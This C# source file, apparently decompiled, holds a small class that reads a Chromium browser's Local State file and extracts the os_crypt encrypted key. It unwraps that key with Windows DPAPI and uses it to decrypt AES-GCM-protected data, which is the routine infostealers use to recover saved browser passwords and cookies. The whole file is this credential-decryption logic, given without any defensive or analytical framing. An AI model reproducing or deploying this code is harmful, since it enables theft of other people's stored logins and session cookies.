using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using sexas.Logic.Extensions;

namespace hostik;

internal class DE
{
	public static byte[] _getKey(string path)
	{
		if (!File.Exists(path))
		{
			return null;
		}
		string json = File.ReadAllText(path);
		byte[] array = null;
		try
		{
			json = json.FromJSON()["os_crypt"]["encrypted_key"].ToString(saving: false);
			return ProtectedData.Unprotect(Convert.FromBase64String(json).Skip(5).ToArray(), (byte[])null, (DataProtectionScope)1);
		}
		catch
		{
			return null;
		}
	}

	public static string _decryptWithKey(byte[] message, byte[] key, int nonSecretPayloadLength)
	{
		if (key != null && key.Length == 32)
		{
			if (message != null && message.Length != 0)
			{
				using (MemoryStream input = new MemoryStream(message))
				{
					using BinaryReader binaryReader = new BinaryReader(input);
					binaryReader.ReadBytes(nonSecretPayloadLength);
					byte[] nonce = binaryReader.ReadBytes(12);
					GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
					AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, nonce);
					gcmBlockCipher.Init(forEncryption: false, parameters);
					byte[] array = binaryReader.ReadBytes(message.Length);
					byte[] array2 = new byte[gcmBlockCipher.GetOutputSize(array.Length)];
					try
					{
						int outOff = gcmBlockCipher.ProcessBytes(array, 0, array.Length, array2, 0);
						gcmBlockCipher.DoFinal(array2, outOff);
					}
					catch (Exception)
					{
						return "";
					}
					return Encoding.Default.GetString(array2);
				}
			}
			throw new ArgumentException("Message required!", "message");
		}
		throw new ArgumentException($"Key needs to be {256} bit!", "key");
	}
}
